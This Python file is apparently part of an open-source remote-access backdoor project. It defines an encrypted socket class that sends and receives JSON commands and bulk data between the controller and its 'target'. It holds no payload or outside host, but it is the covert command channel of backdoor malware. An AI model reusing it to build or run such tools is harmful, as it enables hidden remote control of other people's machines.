"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""
import json
import logging

from src.definitions.commands import OK_SENDALL
from src.logger import LOGGER_ID

from src.gcm import encrypt, decrypt

BUFFER = 1024


class EncryptedSocket:
    def __init__(self, socket, key):
        self.key = key
        self.socket = socket
        self.logger = logging.getLogger(LOGGER_ID)

    def close(self):
        self.socket.close()

    def recvall(self, buffer):
        if self.key is None:
            raise Exception("Key is not set")

        self.send_json(OK_SENDALL)

        data = b""
        while len(data) < buffer:
            data += self.socket.recv(BUFFER)

        data = decrypt(data, self.key)

        self.logger.debug(f"recvall: {data}")

        return data

    def send(self, data):
        if self.key is None:
            raise Exception("Key is not set")
        else:
            data = encrypt(data, self.key)

            self.socket.send(data)

    def recv(self):
        if self.key is None:
            raise Exception("Key is not set")

        return decrypt(self.socket.recv(BUFFER), self.key)

    def recv_json(self):
        data = json.loads(self.recv())

        self.logger.debug(f"recv: {data}")

        return data

    def send_json(self, key, value=None):
        command = json.dumps({"key": key, "value": value})

        self.logger.debug(f"send: {command}")

        command = command.encode()

        self.send(command)

    def sendall_json(self, key, data, sub_value=None, is_bytes=False):
        if self.key is None:
            raise Exception("Key is not set")

        if not is_bytes:
            data = data.encode()

        data = encrypt(data, self.key)

        self.send_json(key, {"buffer": len(data), "value": sub_value})

        # check to make sure that target received signal to continue with transfer
        if self.recv_json()["key"] != OK_SENDALL:
            self.logger.error(f"recvall: failed to get OK signal, got {self.recv_json()['key']} instead")
            return

        self.socket.send(data)


